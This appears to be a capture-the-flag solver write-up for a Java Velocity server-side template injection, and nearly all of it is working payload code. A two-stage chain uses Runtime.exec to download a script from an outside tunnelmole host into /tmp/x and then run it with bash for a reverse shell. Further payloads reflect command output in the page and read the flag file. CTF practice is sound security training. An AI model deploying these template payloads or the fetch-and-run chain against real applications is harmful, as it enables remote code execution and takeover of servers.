# Solver
Java Velocity SSTI Blind RCE
We need two stage payload to execute the reverse shell
Payload 1:
```
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("curl cvsmlo-ip-103-242-105-157.tunnelmole.net/x -o /tmp/x"))
#set($null=$process.waitFor() )
```

Payload 2:
```
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("bash /tmp/x"))
#set($null=$process.waitFor() )
```

## Payload to get the command reflected on the response
Payload 1
```
#set($s="")
#set($stringClass=$s.getClass())
#set($stringBuilderClass=$stringClass.forName("java.lang.StringBuilder"))
#set($inputStreamClass=$stringClass.forName("java.io.InputStream"))
#set($readerClass=$stringClass.forName("java.io.Reader"))
#set($inputStreamReaderClass=$stringClass.forName("java.io.InputStreamReader"))
#set($bufferedReaderClass=$stringClass.forName("java.io.BufferedReader"))
#set($collectorsClass=$stringClass.forName("java.util.stream.Collectors"))
#set($systemClass=$stringClass.forName("java.lang.System"))
#set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
#set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
#set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))

#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("ls /"))
#set($null=$process.waitFor() )

#set($inputStream=$process.getInputStream())
#set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
#set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
#set($stringBuilder=$stringBuilderConstructor.newInstance())

#set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))

$output
```

Payload 2
```
#set($s="")
#set($stringClass=$s.getClass())
#set($stringBuilderClass=$stringClass.forName("java.lang.StringBuilder"))
#set($inputStreamClass=$stringClass.forName("java.io.InputStream"))
#set($readerClass=$stringClass.forName("java.io.Reader"))
#set($inputStreamReaderClass=$stringClass.forName("java.io.InputStreamReader"))
#set($bufferedReaderClass=$stringClass.forName("java.io.BufferedReader"))
#set($collectorsClass=$stringClass.forName("java.util.stream.Collectors"))
#set($systemClass=$stringClass.forName("java.lang.System"))
#set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
#set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
#set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))

#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("cat /flag927f549649.txt"))
#set($null=$process.waitFor() )

#set($inputStream=$process.getInputStream())
#set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
#set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
#set($stringBuilder=$stringBuilderConstructor.newInstance())

#set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))

$output
```
